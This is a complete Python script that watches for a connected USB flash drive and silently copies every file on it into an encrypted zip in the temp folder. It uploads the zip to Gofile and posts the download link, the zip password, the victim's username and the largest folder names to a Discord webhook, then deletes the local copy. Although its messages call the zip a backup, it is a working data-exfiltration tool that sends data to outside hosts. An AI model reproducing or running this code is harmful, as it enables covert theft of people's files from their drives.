import os
import time
import random
import psutil
import getpass
import pyzipper
import requests
import datetime
import tempfile
import math

# Constants
MAX_SIZE_MB = 1024  # Maximum zip file size (in MB)
DISCORD_WEBHOOK = "DISCORD_WEBHOOK"  # Your Discord webhook URL here
PASSWORD = "ZIP_PASSWORD"  # Password to protect the zip file

def get_removable_drives():
    """
    Detects all removable drives connected to the system using psutil.
    """
    drives = []
    for part in psutil.disk_partitions():
        if 'removable' in part.opts.lower():
            drives.append(part.device)
    return drives

def zip_files_from_drive(drive_path, output_zip, max_size):
    """
    Creates an AES encrypted zip archive of all files and folders from the specified drive.
    Stops adding files once the zip file size exceeds max_size.
    """
    stop = False
    with pyzipper.AESZipFile(output_zip, 'w',
                             compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(PASSWORD.encode('utf-8'))  # Set the password for encryption
        for root, dirs, files in os.walk(drive_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, drive_path)
                try:
                    zf.write(file_path, arcname=arcname)
                    print(f"Success: {file_path} added to zip!")
                except Exception as e:
                    print(f"Error: {file_path} could not be added to zip. {e}")
                zf.fp.flush()  # Make sure the write operation is flushed to disk
                if os.path.exists(output_zip):
                    current_size = os.path.getsize(output_zip)
                    if current_size > max_size:
                        print(f"Zip file exceeded the size limit of {max_size} bytes. No more files will be added.")
                        stop = True
                        break
            if stop:
                break

def upload_to_gofile(file_path):
    """
    Uploads the zip file to Gofile using their API, returns download and delete links.
    """
    url = "https://store1.gofile.io/uploadFile"
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(url, files=files)
    response_json = response.json()
    if response_json.get("status") == "ok":
        data = response_json["data"]
        download_link = data.get("downloadPage")
        delete_link = data.get("deletePage")
        print(f"Upload successful! Download link: {download_link}")
        print(f"Delete link: {delete_link}")
        return download_link, delete_link
    else:
        raise Exception("Upload to Gofile failed.")

def send_discord_webhook(webhook_url, message):
    """
    Sends a message to a Discord webhook URL.
    """
    data = {"content": message}
    response = requests.post(webhook_url, json=data)
    if response.status_code in [200, 204]:
        print("Discord webhook message sent.")
    else:
        print(f"Failed to send Discord webhook, status code: {response.status_code}")

def get_directory_size(directory):
    """
    Calculates the total size of all files in a given directory (including subdirectories).
    """
    total_size = 0
    for dirpath, _, filenames in os.walk(directory):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            try:
                total_size += os.path.getsize(fp)
            except Exception as e:
                print(e)
    return total_size

def convert_size(size_bytes):
    """
    Converts the byte size into a human-readable format (B, KB, MB, GB, TB).
    """
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s} {size_name[i]}"

def get_top_10_folders(drive_path):
    """
    Returns the 10 largest folders on the specified drive.
    """
    folder_sizes = []
    for root, dirs, files in os.walk(drive_path):
        for dir in dirs:
            folder_path = os.path.join(root, dir)
            total_size = get_directory_size(folder_path)
            folder_sizes.append((folder_path, total_size))
    
    # Sort by size in descending order and take the top 10 largest folders
    folder_sizes.sort(key=lambda x: x[1], reverse=True)
    top_10_folders = folder_sizes[:10]
    
    # Format the results for readability
    formatted_result = "\n".join([f"📁 {os.path.basename(folder)}: {convert_size(size)}" for folder, size in top_10_folders])
    return formatted_result

def main():
    print("Waiting for a USB flash drive to be connected...")
    detected_drive = None
    while detected_drive is None:
        drives = get_removable_drives()
        if drives:
            detected_drive = drives[0]
            print(f"Detected flash drive: {detected_drive}")
        else:
            time.sleep(5)

    max_size = MAX_SIZE_MB * 1024 * 1024  # Convert the max size to bytes
    output_zip = os.path.join(tempfile.gettempdir(), f"usb_backup_{random.randint(11111, 99999)}.zip")
    print(f"Creating encrypted zip: {output_zip}")
    zip_files_from_drive(detected_drive, output_zip, max_size)
    print("Backup completed.")

    try:
        print("Uploading zip file to Gofile...")
        download_link, delete_link = upload_to_gofile(output_zip)
    except Exception as e:
        print(f"An error occurred during upload: {e}")
        return
    
    zip_size = os.path.getsize(output_zip)
    zip_size_formatted = convert_size(zip_size)
    top_folders_info = get_top_10_folders(detected_drive)
    
    # Prepare the message for Discord webhook
    message = (
        f"@everyone\n\n"
        f"`🔐` **Username**: {getpass.getuser()}\n"
        f"`📅` **Date/Time**: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
        f"`🔗` **Gofile Upload Link**: [Click here to Download](<{download_link}>)\n"
        f"`🗂️` **.zip Password**: `{PASSWORD}`\n"
        f"`📦` **.zip File Size**: `{zip_size_formatted}`\n"
        f"`📂` **Top 10 Largest Folders:**\n"
        "```\n" + top_folders_info + "\n```"
    )
    
    # Send the message to Discord webhook
    send_discord_webhook(DISCORD_WEBHOOK, message)

    # Clean up by removing the zip file from temp directory
    os.remove(output_zip)
    print("Zip file removed from temp directory.")

if __name__ == "__main__":
    main()
